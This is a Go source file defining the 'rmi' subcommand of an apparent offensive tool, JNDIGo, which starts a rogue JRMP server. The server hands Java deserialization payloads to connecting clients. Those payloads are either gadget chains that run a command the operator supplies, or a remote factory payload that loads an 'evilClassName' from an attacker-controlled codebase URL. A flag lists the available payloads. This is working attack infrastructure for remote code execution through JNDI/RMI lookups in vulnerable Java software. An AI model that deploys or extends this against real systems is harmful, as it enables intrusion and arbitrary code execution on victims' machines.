package cmd

import (
	"fmt"
	"github.com/ekixu/JNDIGo/internal/server/rmi"
	"github.com/ekixu/JNDIGo/pkg/serialize"
	"github.com/spf13/cobra"
	"os"
	"os/signal"
	"strconv"
	"syscall"
)

var rmiCmd = &cobra.Command{
	Use:   "rmi host port [payload] [command/evilClassName] [--codebase] [-l]",
	Short: "This command will start JRMP server",
	Long:  `This rmi command will start JRMP server with your payload`,
	Args:  cobra.MinimumNArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		if show, _ := cmd.Flags().GetBool("list"); show {
			all := serialize.GetAllRMIPayloadName()
			for _, v := range all {
				fmt.Printf("\t%s\n", v)
			}
			fmt.Printf("\t%s\n", "factory")
			return
		}

		host := args[0]
		port, err := strconv.Atoi(args[1])
		codebase, _ := cmd.Flags().GetString("codebase")

		if err != nil {
			logger.Errorf("%+v", err)
		}
		if port < 0 || port > 0xffff {
			logger.Errorf("invalid port number")
		}

		var bytePayload []byte

		if len(args) >= 4 {
			payload := args[2]
			command := args[3]
			if payload != "factory" {
				bytePayload, err = serialize.GetErrorWrappedBytePayload(payload, command)
				if err != nil {
					logger.Errorf("%+v", err)
					return
				}
			} else {
				if len(codebase) == 0 {
					logger.Errorf("empty codebase try with --codebase url")
					return
				}
				evilClassname := command
				bytePayload, err = serialize.GetJRMPExceptionWrappedRemoteFactoryPayload(codebase, evilClassname)
				if err != nil {
					logger.Errorf("%+v", err)
				}
			}

		}

		rs := rmi.New(host, port, logger, bytePayload)

		err = rs.Start()

		if err != nil {
			logger.Errorf("JRMP Server Start Error%v", err)
		}

		// When CTRL+C, SIGINT and SIGTERM signal occurs
		// Then stop server gracefully
		ch := make(chan os.Signal)
		signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
		<-ch
		close(ch)

		rs.Stop()
	},
}
